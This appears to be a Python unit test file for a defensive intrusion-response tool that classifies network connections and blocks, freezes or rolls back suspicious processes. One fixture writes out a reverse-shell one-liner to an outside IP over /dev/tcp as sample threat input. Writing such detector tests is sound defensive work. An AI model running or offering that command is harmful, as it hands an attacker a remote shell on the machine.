#!/usr/bin/env python3
import unittest
import time
import os
import myfirewall_core as core
from autonomous_sentinel import sentinel, AutonomousSentinel

class TestAutonomousSentinel(unittest.TestCase):
    def setUp(self):
        core.running = True
        core.blocked_ips.clear()
        sentinel.active_incidents.clear()
        sentinel.frozen_pids.clear()
        sentinel.temporary_drops.clear()

    def test_immutable_core_whitelist(self):
        """Ensures core OS binaries and local endpoints are never autonomously blocked."""
        self.assertTrue(sentinel.is_immutable("systemd", "/lib/systemd/systemd", "1.2.3.4"))
        self.assertTrue(sentinel.is_immutable("sshd", "/usr/sbin/sshd", "1.2.3.4"))
        self.assertTrue(sentinel.is_immutable("custom_app", "/opt/app", "127.0.0.1"))
        self.assertTrue(sentinel.is_immutable("custom_app", "/opt/app", "192.168.1.1"))
        self.assertFalse(sentinel.is_immutable("unknown_script", "/tmp/pwn", "185.190.140.2"))

    def test_normal_traffic_no_false_positive(self):
        """Verifies that legitimate everyday browsing generates zero incidents."""
        conn_safe = {
            "name": "chrome",
            "exe": "/usr/bin/google-chrome",
            "cmdline": "chrome --type=utility",
            "remote_ip": "142.250.190.46",
            "remote_port": 443,
            "hostname": "google.com",
            "status": "ACTIVE",
            "pid": 1234
        }
        inc = sentinel.evaluate_and_respond(conn_safe)
        self.assertIsNone(inc)
        self.assertEqual(len(sentinel.active_incidents), 0)

    def test_tier3_neutralize_reverse_shell(self):
        """Tests that a high-confidence reverse shell triggers Tier 3 neutralization."""
        conn_threat = {
            "name": "sh",
            "exe": "/bin/dash",
            "cmdline": "sh -i >& /dev/tcp/185.190.140.2/4444 0>&1",
            "remote_ip": "185.190.140.2",
            "remote_port": 4444,
            "hostname": "",
            "status": "ACTIVE",
            "pid": 999999  # Non-existent dummy PID
        }
        inc = sentinel.evaluate_and_respond(conn_threat)
        self.assertIsNotNone(inc)
        self.assertEqual(inc.action_tier, "TIER_3_NEUTRALIZE")
        self.assertGreaterEqual(inc.confidence_score, 95)
        self.assertIn("185.190.140.2", core.blocked_ips)

    def test_tier2_freeze_and_rollback(self):
        """Tests Tier 2 non-destructive freeze and 1-click rollback."""
        conn_dropper = {
            "name": "updater",
            "exe": "/tmp/suspicious_updater",
            "cmdline": "/tmp/suspicious_updater",
            "remote_ip": "45.142.195.10",
            "remote_port": 1337,
            "hostname": "",
            "status": "ACTIVE",
            "pid": 888888
        }
        inc = sentinel.evaluate_and_respond(conn_dropper)
        self.assertIsNotNone(inc)
        self.assertEqual(inc.action_tier, "TIER_2_FREEZE_PAUSE")
        self.assertIn("45.142.195.10", core.blocked_ips)
        self.assertIn(888888, sentinel.frozen_pids)

        # Test Rollback
        success = sentinel.rollback_incident(inc.incident_id)
        self.assertTrue(success)
        self.assertNotIn(888888, sentinel.frozen_pids)
        self.assertNotIn("45.142.195.10", core.blocked_ips)
        self.assertIn("45.142.195.10", core.ignored_ips)

if __name__ == "__main__":
    unittest.main()
